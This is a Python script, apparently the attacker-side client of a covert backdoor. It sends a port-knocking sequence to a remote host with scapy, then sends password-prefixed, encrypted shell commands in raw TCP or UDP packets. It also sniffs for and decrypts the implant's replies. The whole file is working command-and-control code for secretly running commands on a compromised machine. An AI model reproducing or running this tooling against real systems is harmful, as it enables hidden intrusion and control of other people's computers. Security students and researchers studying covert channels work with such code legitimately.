#!/usr/bin/python3
"""
dnf install python3-netifaces
dnf install python3-devel
pip3 install pycrypto
pip3 install scapy-python3
"""
from __future__ import print_function
import time, os, sys, logging
import threading
import attackerConfig
from scapy.all import *
import netifaces
import encryption

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

localIP = attackerConfig.localIP
localPort = attackerConfig.localPort
listenPort = attackerConfig.listenPort
remoteIP = attackerConfig.remoteIP
remotePort = attackerConfig.remotePort
protocol = attackerConfig.protocol

def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def portKnocking():
    ports = attackerConfig.portKnocks
    for port in ports:
        packet = IP(dst=remoteIP, src=localIP)/UDP(dport=listenPort, sport=port)
        print("Knock...%d" % port)
        send(packet, verbose=False)
        time.sleep(attackerConfig.delay)
    print("Start to enter command...")

def sendCommand():
    while True:
        cmd = input(" ")
        sys.stdout.flush()
        payload = encryption.encrypt(attackerConfig.password + cmd)
        if protocol.upper() == 'TCP':
            packet = IP(dst=remoteIP, src=localIP)/TCP(dport=remotePort, sport=localPort)/Raw(load=payload)
        elif protocol.upper() == 'UDP':
            packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=payload)
        send(packet, verbose=False)

def parsePacket(packet):
    """
    """
    payload = packet[protocol.upper()].payload.load
    data = encryption.decrypt(payload)
    try:
        data = data.decode()
    except AttributeError:
        pass
    if data == "":
        return
    password = data[:8]
    result = data[8:]
    if password not in attackerConfig.password:
        return
    else:
        print("Result: %s" % result)

def is_incoming(packet):
    """
    Check if packets are incoming or outgoing.
    """
    # Get the default hardware interface
    defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
    return packet[Ether].src != hardwareAddr

def listen(mFilter):
    sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket)

def main():
    mFilter = protocol + " src port " + str(remotePort) + " and dst port " + \
            str(localPort) + " and src host " + remoteIP
    testFilter = "tcp src port 8505"
    checkRootPrivilege()
    portKnocking()

    print("Filter: %s" % mFilter)

    send_command_thread = threading.Thread(target=sendCommand)
    send_command_thread.setDaemon(True)
    send_command_thread.start()

    listen_thread = threading.Thread(target=listen, args =(mFilter,))
    listen_thread.setDaemon(True)
    listen_thread.start()

    send_command_thread.join()
    listen_thread.join()

    try:
        while threading.active_count() > 0:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print('Attacker closed...\n')
        sys.exit(0)

if __name__ == '__main__':
    main()
